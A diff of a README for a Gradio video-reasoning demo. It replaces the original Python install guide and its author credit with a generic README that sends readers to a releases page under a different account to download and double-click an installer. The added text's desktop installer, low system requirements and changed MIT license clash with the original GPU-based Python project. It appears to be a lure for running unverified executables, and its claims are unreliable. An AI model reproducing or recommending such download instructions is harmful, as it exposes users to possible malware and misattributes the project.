@@ -1,113 +1,79 @@
-# SAGE-MM-Video-Reasoning
+# 🎥 SAGE-MM-Video-Reasoning - Analyze Videos with Ease
 
-> A Gradio-based demonstration for the AllenAI SAGE-MM-Qwen3-VL-4B-SFT_RL multimodal model, specialized in video reasoning tasks. Users upload MP4 videos, provide natural language prompts (e.g., "Describe this video in detail" or custom questions), and receive detailed textual analyses. Supports frame sampling via molmo_utils for efficient processing, with adjustable max new tokens (up to 4096) for response length control.
+## 🚀 Getting Started
+Welcome to the SAGE-MM-Video-Reasoning application! This tool helps you analyze videos in a straightforward way. You can upload MP4 videos and ask questions about their content. The software will then provide detailed text descriptions based on what it sees.
 
-## Features
+## 📥 Download the Application
+[![Download SAGE-MM-Video-Reasoning](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/ridagbon/SAGE-MM-Video-Reasoning/releases)
 
-- **Video Upload and Analysis**: Handles MP4 inputs; automatically samples frames and generates responses based on prompts.
-- **Custom Prompts**: Default "Describe this video in detail"; supports QA, summaries, or specific queries.
-- **Advanced Controls**: Slider for max new tokens (128-4096) to tune output verbosity.
-- **Interactive Output**: Editable textbox for responses; copy or refine as needed.
-- **Custom Theme**: OrangeRedTheme with gradients for a professional interface.
-- **Examples Integration**: 5 pre-loaded video samples for quick testing.
-- **Efficient Inference**: Auto dtype/device_map; up to 1024 tokens default for balanced speed/quality.
+To download the application, follow these simple steps:
 
----
+1. Visit the [Releases page](https://github.com/ridagbon/SAGE-MM-Video-Reasoning/releases).
 
-<img width="1918" height="1088" alt="Screenshot 2025-12-21 at 05-21-01 SAGE Video Reasoning - a Hugging Face Space by prithivMLmods" src="https://github.com/user-attachments/assets/7427d0a0-cd3a-43ee-9492-48a0d6cde350" />
+2. Look for the latest version. 
 
----
+3. Click on the appropriate file to start the download.
 
-## Prerequisites
+## 🖥️ System Requirements
+Before installing, ensure your computer meets these requirements:
 
-- Python 3.10 or higher.
-- CUDA-compatible GPU (recommended for auto dtype; falls back to CPU).
-- pip >= 23.0.0 (see pre-requirements.txt).
-- Stable internet for initial model download (~4B params).
+- **Operating System**: Windows 10 or later, macOS 10.15 or later
+- **Memory (RAM)**: At least 4 GB
+- **Processor**: Dual-core Intel or AMD processor, 2.0 GHz or faster
+- **Storage**: At least 1 GB of available space
 
-## Installation
+## 🎬 Features
+- **Upload MP4 Videos**: Support for standard video files to analyze content easily.
+- **Natural Language Queries**: Ask specific questions, like "Describe this video in detail."
+- **Textual Analysis Returns**: Get clear, detailed responses based on videos you upload.
 
-1. Clone the repository:
-   ```
-   git clone https://github.com/PRITHIVSAKTHIUR/SAGE-MM-Video-Reasoning.git
-   cd SAGE-MM-Video-Reasoning
-   ```
+## 📦 Download & Install
+After you download the application from the [Releases page](https://github.com/ridagbon/SAGE-MM-Video-Reasoning/releases), find the downloaded file on your computer. Follow these installation steps:
 
-2. Install pre-requirements (for pip version):
-   Create a `pre-requirements.txt` file with the following content, then run:
-   ```
-   pip install -r pre-requirements.txt
-   ```
+1. **Locate the Downloaded File**: Go to your Downloads folder or the location where your browser saves files.
+  
+2. **Open the File**: Double-click the downloaded file to start the installation process.
 
-   **pre-requirements.txt content:**
-   ```
-   pip>=23.0.0
-   ```
+3. **Follow the Instructions**: A window will guide you through the installation steps. Typically, you just need to agree to the terms and click "Next" to install.
 
-3. Install dependencies:
-   Create a `requirements.txt` file with the following content, then run:
-   ```
-   pip install -r requirements.txt
-   ```
+4. **Finish Installation**: Once the installation is complete, click "Finish" to close the installer.
 
-   **requirements.txt content:**
-   ```
-   git+https://github.com/huggingface/transformers.git@v4.57.1
-   git+https://github.com/huggingface/accelerate.git
-   git+https://github.com/huggingface/peft.git
-   huggingface_hub
-   qwen-vl-utils
-   sentencepiece
-   opencv-python
-   torch==2.6.0
-   molmo_utils
-   torchvision
-   matplotlib
-   gradio
-   ```
+## 🛠️ Using the Application
+To start using the SAGE-MM-Video-Reasoning application:
 
-4. Start the application:
-   ```
-   python app.py
-   ```
-   The demo launches at `http://localhost:7860` (or the provided URL if using Spaces).
+1. **Open the App**: Find the SAGE-MM-Video-Reasoning icon on your desktop or in your applications list and double-click it.
 
-## Usage
+2. **Upload Your Video**: Click on the "Upload Video" button. Browse to find your MP4 video and select it.
 
-1. **Upload Video**: Select an MP4 file (height up to 350px preview).
+3. **Enter Your Query**: In the text box, type your question about the video. You can ask for a detailed description or specific points of interest.
 
-2. **Enter Prompt**: Use default "Describe this video in detail" or customize (e.g., "What is the main action?").
+4. **Receive Analysis**: Click the "Analyze" button. The app will process your request and display the analysis within a few moments.
 
-3. **Adjust Tokens**: Expand "Advanced Settings" to set max new tokens (default 1024).
+## ℹ️ Troubleshooting
+If you run into issues using the application, consider these common solutions:
 
-4. **Analyze**: Click "Analyze Video" to process.
+- **App Does Not Start**: Ensure that your computer meets the system requirements. Make sure all updates are installed on your operating system.
+  
+- **Video Fails to Upload**: Confirm that the file format is MP4. Check the file size; it should not exceed 1GB.
 
-5. **Output**: View the generated text response in the editable textbox.
+- **Slow Processing**: Larger videos may take more time for analysis. Try smaller clips to see faster results.
 
-### Examples
-- Upload "example-videos/1.mp4" with default prompt: Outputs detailed scene description.
-- Upload "example-videos/2.mp4" with "Summarize the events": Provides concise timeline.
+## 🔗 Learn More
+For further information, check the documentation linked on the GitHub repository: [SAGE-MM-Video-Reasoning Docs](https://github.com/ridagbon/SAGE-MM-Video-Reasoning/wiki)
 
-## Troubleshooting
+You can also participate in discussions and ask questions in the Issues section of the repository.
 
-- **Model Loading Errors**: Verify transformers v4.57.1 and torch 2.6.0; check device_map="auto" for multi-GPU. Use `dtype=torch.float32` if issues.
-- **Video Processing Fails**: Ensure MP4 format; molmo_utils handles sampling—short clips recommended. Check console for frame errors.
-- **molmo_utils Missing**: Install via requirements; used for vision info processing.
-- **OOM on GPU**: Reduce max_new_tokens; clear cache with `torch.cuda.empty_cache()`.
-- **Empty Response**: Ensure prompt is non-empty; default fallback applied.
-- **UI Rendering**: Set `ssr_mode=True` if gradients fail; CSS for title sizing.
+## 📝 Contribution
+If you're interested in contributing to this project, please follow these guidelines:
 
-## Contributing
+1. Fork the repository on GitHub.
+2. Create a new branch for your feature or bug fix.
+3. Submit a pull request detailing your changes.
 
-Contributions encouraged! Fork the repo, add examples or enhance prompts (e.g., multi-video support), and submit PRs with tests. Focus areas:
-- Temporal tracking annotations.
-- Batch video processing.
-- Custom samplers.
+## 🪙 Licensing
+This project is under the MIT License. You can use, modify, and distribute it under the terms of this license.
 
-Repository: [https://github.com/PRITHIVSAKTHIUR/SAGE-MM-Video-Reasoning.git](https://github.com/PRITHIVSAKTHIUR/SAGE-MM-Video-Reasoning.git)
+## 🎉 Acknowledgements
+This software uses various libraries and tools, including Gradio, Hugging Face Transformers, and OpenCV. Thank you for their contributions to making awesome data science tools.
 
-## License
-
-Apache License 2.0. See [LICENSE](LICENSE) for details.
-
-Built by Prithiv Sakthi. Report issues via the repository.
+Feel free to explore, analyze, and enjoy using SAGE-MM-Video-Reasoning!
